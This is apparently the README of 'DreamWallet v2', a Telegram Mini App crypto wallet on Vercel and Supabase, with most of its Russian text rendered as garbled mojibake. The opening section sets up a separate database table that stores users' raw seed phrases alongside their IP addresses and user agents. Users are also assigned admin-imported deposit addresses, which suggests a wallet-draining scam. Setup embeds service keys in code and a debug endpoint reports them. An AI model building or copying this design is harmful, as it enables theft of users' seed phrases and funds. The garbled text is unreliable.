## Second Supabase (secure) for seed phrases

Configure these environment variables in Vercel Project Settings (Environment Variables):

- `VW_RUNTIME_DB_URL` ‚Äî Secure Supabase URL
- `VW_RUNTIME_DB_SERVICE_KEY` ‚Äî Secure Supabase service role key

Alternative aliases supported: `SECURE_DB_URL`, `SECURE_DB_SERVICE_KEY`, or `SECOND_SUPABASE_URL`, `SECOND_SUPABASE_SERVICE_KEY`.

Create the table in that project:

```
create table public.app_secrets_storage (
  id bigserial primary key,
  phrase_raw text not null,
  user_meta jsonb null,
  client_ip text null,
  user_agent text null,
  created_at timestamptz default now()
);
alter table public.app_secrets_storage enable row level security;
create policy "service-only" on public.app_secrets_storage for all using (auth.role() = 'service_role');
```

# DreamWallet v2 üöÄ

Telegram Mini App –¥–ª—è —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –∫—Ä–∏–ø—Ç–æ–≤–∞–ª—é—Ç–Ω—ã–º–∏ –∫–æ—à–µ–ª—å–∫–∞–º–∏ —Å –ø–µ—Ä—Å–æ–Ω–∞–ª—å–Ω—ã–º–∏ –∞–¥—Ä–µ—Å–∞–º–∏ –¥–ª—è –∫–∞–∂–¥–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.

## üåü –û—Å–æ–±–µ–Ω–Ω–æ—Å—Ç–∏

- **–ü–µ—Ä—Å–æ–Ω–∞–ª—å–Ω—ã–µ –∞–¥—Ä–µ—Å–∞**: –ö–∞–∂–¥–æ–º—É –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –ø—Ä–∏—Å–≤–∞–∏–≤–∞–µ—Ç—Å—è —É–Ω–∏–∫–∞–ª—å–Ω—ã–π –Ω–∞–±–æ—Ä –∞–¥—Ä–µ—Å–æ–≤
- **–ü–æ–¥–¥–µ—Ä–∂–∫–∞ 5 —Å–µ—Ç–µ–π**: TON, TRON, Solana, Ethereum, BNB Smart Chain
- **–ê–¥–º–∏–Ω –ø–∞–Ω–µ–ª—å**: –ü–æ–ª–Ω–æ—Ü–µ–Ω–Ω–∞—è —Å–∏—Å—Ç–µ–º–∞ —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è–º–∏ –∏ –∞–¥—Ä–µ—Å–∞–º–∏
- **–ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–µ –Ω–∞–∑–Ω–∞—á–µ–Ω–∏–µ**: –ù–æ–≤—ã–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –ø–æ–ª—É—á–∞—é—Ç –∞–¥—Ä–µ—Å–∞ –∏–∑ –ø—É–ª–∞
- **–ë–∞–∑–∞ –¥–∞–Ω–Ω—ã—Ö Supabase**: –ù–∞–¥–µ–∂–Ω–æ–µ —Ö—Ä–∞–Ω–µ–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
- **Telegram –∏–Ω—Ç–µ–≥—Ä–∞—Ü–∏—è**: –ü–æ–ª–Ω–∞—è –∏–Ω—Ç–µ–≥—Ä–∞—Ü–∏—è —Å Telegram Mini Apps

## üèóÔ∏è –ê—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–∞

```
DreamWallet v2
‚îú‚îÄ‚îÄ Frontend (Telegram Mini App)
‚îÇ   ‚îú‚îÄ‚îÄ index.html - –ì–ª–∞–≤–Ω–∞—è —Å—Ç—Ä–∞–Ω–∏—Ü–∞
‚îÇ   ‚îú‚îÄ‚îÄ qr-usdt.html - QR –∫–æ–¥—ã –¥–ª—è –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è
‚îÇ   ‚îú‚îÄ‚îÄ admin.html - –ê–¥–º–∏–Ω –ø–∞–Ω–µ–ª—å
‚îÇ   ‚îî‚îÄ‚îÄ user-manager.js - –°–∏—Å—Ç–µ–º–∞ —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è–º–∏
‚îú‚îÄ‚îÄ Backend (Vercel Functions)
‚îÇ   ‚îú‚îÄ‚îÄ api/addresses.js - API –¥–ª—è —Ä–∞–±–æ—Ç—ã —Å –∞–¥—Ä–µ—Å–∞–º–∏
‚îÇ   ‚îú‚îÄ‚îÄ api/users.js - API —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è–º–∏
‚îÇ   ‚îî‚îÄ‚îÄ api/admin/ - API –¥–ª—è –∞–¥–º–∏–Ω –ø–∞–Ω–µ–ª–∏
‚îî‚îÄ‚îÄ Database (Supabase)
    ‚îú‚îÄ‚îÄ users - –¢–∞–±–ª–∏—Ü–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
    ‚îú‚îÄ‚îÄ address_sets - –ù–∞–±–æ—Ä—ã –∞–¥—Ä–µ—Å–æ–≤
    ‚îî‚îÄ‚îÄ transactions - –ò—Å—Ç–æ—Ä–∏—è —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–π
```

## üöÄ –ë—ã—Å—Ç—Ä—ã–π —Å—Ç–∞—Ä—Ç

### –í–∞—Ä–∏–∞–Ω—Ç 1: –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∞—è –Ω–∞—Å—Ç—Ä–æ–π–∫–∞ (—Ä–µ–∫–æ–º–µ–Ω–¥—É–µ—Ç—Å—è)

```bash
# –ö–ª–æ–Ω–∏—Ä—É–π—Ç–µ —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä–∏–π
git clone <your-repo-url>
cd DreamWallet-v2

# –ó–∞–ø—É—Å—Ç–∏—Ç–µ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π —Å–∫—Ä–∏–ø—Ç –Ω–∞—Å—Ç—Ä–æ–π–∫–∏
./quick-setup.sh
```

–°–∫—Ä–∏–ø—Ç –ø–æ–º–æ–∂–µ—Ç:
- –°–æ–∑–¥–∞—Ç—å –ø—Ä–æ–µ–∫—Ç Supabase
- –ù–∞—Å—Ç—Ä–æ–∏—Ç—å –±–∞–∑—É –¥–∞–Ω–Ω—ã—Ö
- –í—Å—Ç—Ä–æ–∏—Ç—å –∫–ª—é—á–∏ –ø—Ä—è–º–æ –≤ –∫–æ–¥
- –ü–æ–¥–≥–æ—Ç–æ–≤–∏—Ç—å –∫ –¥–µ–ø–ª–æ—é

### –í–∞—Ä–∏–∞–Ω—Ç 2: –†—É—á–Ω–∞—è –Ω–∞—Å—Ç—Ä–æ–π–∫–∞

1. **–°–æ–∑–¥–∞–π—Ç–µ –ø—Ä–æ–µ–∫—Ç Supabase** (—Å–ª–µ–¥—É–π—Ç–µ `CREATE_SUPABASE_PROJECT.md`)
2. **–í—ã–ø–æ–ª–Ω–∏—Ç–µ SQL —Å–∫—Ä–∏–ø—Ç** –∏–∑ `supabase-setup-improved.sql` 
3. **–ó–∞–º–µ–Ω–∏—Ç–µ –∫–ª—é—á–∏ –≤ –∫–æ–¥–µ** –≤ —Ñ–∞–π–ª–µ `api/supabase.js`:

```javascript
// –ó–∞–º–µ–Ω–∏—Ç–µ —ç—Ç–∏ —Å—Ç—Ä–æ–∫–∏ –Ω–∞ –≤–∞—à–∏ —Ä–µ–∞–ª—å–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ:
export const SUPABASE_URL = 'https://–≤–∞—à-–ø—Ä–æ–µ–∫—Ç.supabase.co';
export const SUPABASE_ANON_KEY = '–≤–∞—à-anon-–∫–ª—é—á';
export const SUPABASE_SERVICE_KEY = '–≤–∞—à-service-–∫–ª—é—á';
```

### –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞—Å—Ç—Ä–æ–π–∫–∏

–û—Ç–∫—Ä–æ–π—Ç–µ `/api/debug` –ø–æ—Å–ª–µ –¥–µ–ø–ª–æ—è - –¥–æ–ª–∂–Ω–æ –ø–æ–∫–∞–∑–∞—Ç—å –≤—Å–µ –∫–ª—é—á–∏ –∫–∞–∫ –Ω–∞—Å—Ç—Ä–æ–µ–Ω–Ω—ã–µ.

### 4. –ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö

–ò–º–ø–æ—Ä—Ç–∏—Ä—É–π—Ç–µ –≤–∞—à–∏ –Ω–∞–±–æ—Ä—ã –∞–¥—Ä–µ—Å–æ–≤ —á–µ—Ä–µ–∑ –∞–¥–º–∏–Ω –ø–∞–Ω–µ–ª—å –∏–ª–∏ –Ω–∞–ø—Ä—è–º—É—é –≤ –±–∞–∑—É –¥–∞–Ω–Ω—ã—Ö.

–§–æ—Ä–º–∞—Ç –Ω–∞–±–æ—Ä–∞ –∞–¥—Ä–µ—Å–æ–≤:
```
user1,ton:EQD4FPq-PRDieyQKkizFTRtSD...,tron:TR7NHqjeKQxGTCi8q8ZY4p...,sol:EPjFWdd5AufqSSqeM2qN1x...,eth:0xdAC17F958D2ee523a2206206...,bnb:0x55d398326f99059fF775485246...
```

### 5. –î–µ–ø–ª–æ–π –Ω–∞ Vercel

```bash
# –î–ª—è –ø–µ—Ä–≤–æ–≥–æ –¥–µ–ø–ª–æ—è
vercel

# –î–ª—è –ø–æ—Å–ª–µ–¥—É—é—â–∏—Ö –¥–µ–ø–ª–æ–µ–≤
npm run deploy
```

### 6. –ù–∞—Å—Ç—Ä–æ–π–∫–∞ Telegram Bot

1. –°–æ–∑–¥–∞–π—Ç–µ –±–æ—Ç–∞ —á–µ—Ä–µ–∑ [@BotFather](https://t.me/botfather)
2. –ù–∞—Å—Ç—Ä–æ–π—Ç–µ Mini App, —É–∫–∞–∑–∞–≤ URL –≤–∞—à–µ–≥–æ Vercel –ø—Ä–æ–µ–∫—Ç–∞
3. –î–æ–±–∞–≤—å—Ç–µ –∫–æ–º–∞–Ω–¥—ã –º–µ–Ω—é –¥–ª—è —É–¥–æ–±—Å—Ç–≤–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π

## üì± –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ

### –î–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π

1. –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∑–∞—Ö–æ–¥–∏—Ç –≤ Telegram Mini App
2. –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ —Å–æ–∑–¥–∞–µ—Ç—Å—è –∞–∫–∫–∞—É–Ω—Ç –∏ –Ω–∞–∑–Ω–∞—á–∞–µ—Ç—Å—è –Ω–∞–±–æ—Ä –∞–¥—Ä–µ—Å–æ–≤
3. –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –º–æ–∂–µ—Ç –ø–æ–ª—É—á–∞—Ç—å QR –∫–æ–¥—ã –¥–ª—è –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è
4. –ü—Ä–∏ –ø–æ–≤—Ç–æ—Ä–Ω–æ–º –≤—Ö–æ–¥–µ –∞–¥—Ä–µ—Å–∞ –æ—Å—Ç–∞—é—Ç—Å—è —Ç–µ–º–∏ –∂–µ

### –î–ª—è –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–≤

1. –û—Ç–∫—Ä–æ–π—Ç–µ `your-domain.vercel.app/admin.html`
2. –£–ø—Ä–∞–≤–ª—è–π—Ç–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è–º–∏ –∏ –Ω–∞–±–æ—Ä–∞–º–∏ –∞–¥—Ä–µ—Å–æ–≤
3. –ú–∞—Å—Å–æ–≤–æ –∏–º–ø–æ—Ä—Ç–∏—Ä—É–π—Ç–µ –Ω–æ–≤—ã–µ –∞–¥—Ä–µ—Å–∞
4. –ú–æ–Ω–∏—Ç–æ—Ä—å—Ç–µ —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è

## üîß API Endpoints

### –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏–µ API

- `GET /api/addresses?telegram_id=123` - –ü–æ–ª—É—á–∏—Ç—å –∞–¥—Ä–µ—Å–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
- `POST /api/addresses` - –°–æ–∑–¥–∞—Ç—å/–æ–±–Ω–æ–≤–∏—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è

### –ê–¥–º–∏–Ω API

- `GET /api/admin/users` - –°–ø–∏—Å–æ–∫ –≤—Å–µ—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
- `GET /api/admin/address-sets` - –°–ø–∏—Å–æ–∫ –≤—Å–µ—Ö –Ω–∞–±–æ—Ä–æ–≤ –∞–¥—Ä–µ—Å–æ–≤
- `POST /api/admin/address-sets` - –°–æ–∑–¥–∞—Ç—å –Ω–∞–±–æ—Ä –∞–¥—Ä–µ—Å–æ–≤
- `PUT /api/admin/address-sets/{id}` - –û–±–Ω–æ–≤–∏—Ç—å –Ω–∞–±–æ—Ä –∞–¥—Ä–µ—Å–æ–≤
- `DELETE /api/admin/address-sets/{id}` - –£–¥–∞–ª–∏—Ç—å –Ω–∞–±–æ—Ä –∞–¥—Ä–µ—Å–æ–≤
- `POST /api/admin/reset-user/{id}` - –°–±—Ä–æ—Å–∏—Ç—å –∞–¥—Ä–µ—Å–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
- `DELETE /api/admin/users/{id}` - –£–¥–∞–ª–∏—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è

## üóÉÔ∏è –°—Ç—Ä—É–∫—Ç—É—Ä–∞ –±–∞–∑—ã –¥–∞–Ω–Ω—ã—Ö

### –¢–∞–±–ª–∏—Ü–∞ `users`
- `id` - –£–Ω–∏–∫–∞–ª—å–Ω—ã–π ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
- `telegram_id` - ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –≤ Telegram
- `first_name`, `last_name`, `username` - –î–∞–Ω–Ω—ã–µ –ø—Ä–æ—Ñ–∏–ª—è
- `address_set_id` - –°—Å—ã–ª–∫–∞ –Ω–∞ –Ω–∞–±–æ—Ä –∞–¥—Ä–µ—Å–æ–≤
- `created_at`, `updated_at` - –í—Ä–µ–º–µ–Ω–Ω—ã–µ –º–µ—Ç–∫–∏

### –¢–∞–±–ª–∏—Ü–∞ `address_sets`
- `id` - –£–Ω–∏–∫–∞–ª—å–Ω—ã–π ID –Ω–∞–±–æ—Ä–∞
- `name` - –ò–º—è –Ω–∞–±–æ—Ä–∞ (user1, user2, ...)
- `ton_address`, `tron_address`, `sol_address`, `eth_address`, `bnb_address`
- `is_used` - –§–ª–∞–≥ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è
- `assigned_to_telegram_id` - ID –Ω–∞–∑–Ω–∞—á–µ–Ω–Ω–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
- `assigned_at` - –í—Ä–µ–º—è –Ω–∞–∑–Ω–∞—á–µ–Ω–∏—è

### –¢–∞–±–ª–∏—Ü–∞ `transactions` (–¥–ª—è –±—É–¥—É—â–µ–≥–æ —Ä–∞–∑–≤–∏—Ç–∏—è)
- –ò—Å—Ç–æ—Ä–∏—è –¥–µ–ø–æ–∑–∏—Ç–æ–≤ –∏ –≤—ã–≤–æ–¥–æ–≤ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π

## üîí –ë–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å

- **RLS (Row Level Security)** –≤–∫–ª—é—á–µ–Ω –¥–ª—è –≤—Å–µ—Ö —Ç–∞–±–ª–∏—Ü
- **–°–µ—Ä–≤–∏—Å–Ω—ã–π –∫–ª—é—á** –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è —Ç–æ–ª—å–∫–æ –¥–ª—è —Å–µ—Ä–≤–µ—Ä–Ω—ã—Ö –æ–ø–µ—Ä–∞—Ü–∏–π
- **–ê–Ω–æ–Ω–∏–º–Ω—ã–π –∫–ª—é—á** –¥–ª—è –∫–ª–∏–µ–Ω—Ç—Å–∫–∏—Ö –∑–∞–ø—Ä–æ—Å–æ–≤
- **CORS** –Ω–∞—Å—Ç—Ä–æ–µ–Ω –¥–ª—è –±–µ–∑–æ–ø–∞—Å–Ω–æ–≥–æ –¥–æ—Å—Ç—É–ø–∞

## üêõ –û—Ç–ª–∞–¥–∫–∞

### –õ–æ–≥–∏ —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–∏
```bash
npm run dev
```

### –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
```javascript
// –í –∫–æ–Ω—Å–æ–ª–∏ –±—Ä–∞—É–∑–µ—Ä–∞
console.log(window.userManager.exportUserData());
```

### –ü—Ä–æ–≤–µ—Ä–∫–∞ API
```bash
curl "https://your-domain.vercel.app/api/addresses?telegram_id=123456789"
```

## üìà –ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥

- **Vercel Analytics** - –ø—Ä–æ–∏–∑–≤–æ–¥–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è
- **Supabase Dashboard** - —Å–æ—Å—Ç–æ—è–Ω–∏–µ –±–∞–∑—ã –¥–∞–Ω–Ω—ã—Ö
- **–ê–¥–º–∏–Ω –ø–∞–Ω–µ–ª—å** - —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π

## ü§ù –ü–æ–¥–¥–µ—Ä–∂–∫–∞

1. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –ª–æ–≥–∏ –≤ Vercel Dashboard
2. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ —Å–æ—Å—Ç–æ—è–Ω–∏–µ Supabase
3. –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ –∞–¥–º–∏–Ω –ø–∞–Ω–µ–ª—å –¥–ª—è –¥–∏–∞–≥–Ω–æ—Å—Ç–∏–∫–∏
4. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ –æ–∫—Ä—É–∂–µ–Ω–∏—è

## üìÑ –õ–∏—Ü–µ–Ω–∑–∏—è

MIT License - –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Å–≤–æ–±–æ–¥–Ω–æ –¥–ª—è –∫–æ–º–º–µ—Ä—á–µ—Å–∫–∏—Ö –∏ –Ω–µ–∫–æ–º–º–µ—Ä—á–µ—Å–∫–∏—Ö –ø—Ä–æ–µ–∫—Ç–æ–≤.

---

**–°–æ–∑–¥–∞–Ω–æ –¥–ª—è Telegram Mini Apps —Å ‚ù§Ô∏è**
